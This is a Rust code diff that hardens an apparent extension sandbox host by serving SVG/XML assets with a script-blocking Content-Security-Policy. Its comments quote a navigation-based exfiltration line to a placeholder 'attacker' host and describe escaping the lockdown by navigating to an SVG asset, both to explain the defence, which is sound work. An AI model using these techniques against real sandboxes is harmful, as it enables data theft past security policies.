@@ -213,7 +213,10 @@ fn content_security_policy(origin: &str) -> String {
 /// The `Content-Security-Policy` served with the trusted wrapper document.
 ///
 /// `frame-src` is the **navigation wall**, and it is the reason the wrapper
-/// exists at all. `connect-src 'none'` on the extension document stops fetch,
+/// exists at all. It names the frame-host origin, which deliberately leaves a
+/// multi-page HTML extension able to navigate within itself. Non-HTML documents
+/// reachable that way are neutralised by policy instead — see
+/// [`document_content_security_policy`] — rather than by forbidding navigation. `connect-src 'none'` on the extension document stops fetch,
 /// WebSocket and EventSource — it does **not** stop `location.href = "https://
 /// attacker/?d=" + data`, because navigation is not a fetch directive. A
 /// `sandbox="allow-scripts"` frame cannot navigate its parent, but it can
@@ -369,6 +372,48 @@ fn document_with_lockdown(html: &str, origin: &str) -> String {
     format!("<!doctype html>\n<script src=\"{origin}/{LOCKDOWN_ROUTE}\"></script>\n{html}")
 }
 
+/// Content types that can become a **script-bearing realm** by being navigated
+/// to or framed, but which the host cannot write a lockdown prologue into.
+///
+/// The SVG/XML document family. An `<svg>` served as a document is a realm: it
+/// may carry inline handlers and `<script href>`, and a locked extension can
+/// reach one simply by navigating its own frame to a package asset — shedding
+/// the initial realm's lockdown without ever creating a child frame.
+///
+/// This is deliberately **not** "everything that is not HTML". A worker derives
+/// its execution policy from its own response headers, so putting
+/// `script-src 'none'` on served JavaScript would break legitimate workers and
+/// `importScripts`. Scripts, styles, fonts and images are *subresources*: they
+/// do not get a realm, and they keep what they legitimately need.
+const ACTIVE_NON_HTML_DOCUMENT_TYPES: &[&str] = &[
+    "image/svg+xml",
+    "application/xhtml+xml",
+    "application/xml",
+    "text/xml",
+];
+
+/// The policy served with one package asset, chosen by what it can become.
+///
+/// Two document classes, one invariant — *every document the extension can
+/// navigate to or frame is covered*:
+///
+/// - **HTML** keeps `script-src <origin>` and receives the lockdown prologue.
+/// - **SVG/XML documents** get `script-src 'none'`: they cannot be given a
+///   prologue, so instead they are refused the ability to execute at all.
+///   Rendering is untouched, so an `<img src="asset.svg">` still draws — an
+///   image never runs script, and an SVG that wants to is the attack.
+/// - **Subresources** are served the ordinary policy and are unaffected.
+fn asset_content_security_policy(origin: &str, content_type: &str) -> String {
+    let base = content_security_policy(origin);
+    if ACTIVE_NON_HTML_DOCUMENT_TYPES
+        .iter()
+        .any(|kind| content_type.starts_with(kind))
+    {
+        return base.replace(&format!("script-src {origin}"), "script-src 'none'");
+    }
+    base
+}
+
 #[derive(Clone)]
 struct HostState {
     base_dir: PathBuf,
@@ -495,9 +540,6 @@ async fn serve_asset(
     };
 
     let content_type = content_type_for(&path);
-    // HTML is the only thing that gets a realm, so it is the only thing that
-    // needs the lockdown. A non-UTF-8 body is served untouched rather than
-    // mangled — it cannot execute anyway.
     let bytes = if content_type.starts_with("text/html") {
         match std::str::from_utf8(&bytes) {
             Ok(html) => document_with_lockdown(html, &state.origin).into_bytes(),
@@ -518,7 +560,7 @@ async fn serve_asset(
     insert(
         headers,
         header::CONTENT_SECURITY_POLICY,
-        &content_security_policy(&state.origin),
+        &asset_content_security_policy(&state.origin, content_type),
     );
     // The package's own naming decides the type; never let a browser re-guess.
     insert(headers, header::X_CONTENT_TYPE_OPTIONS, "nosniff");
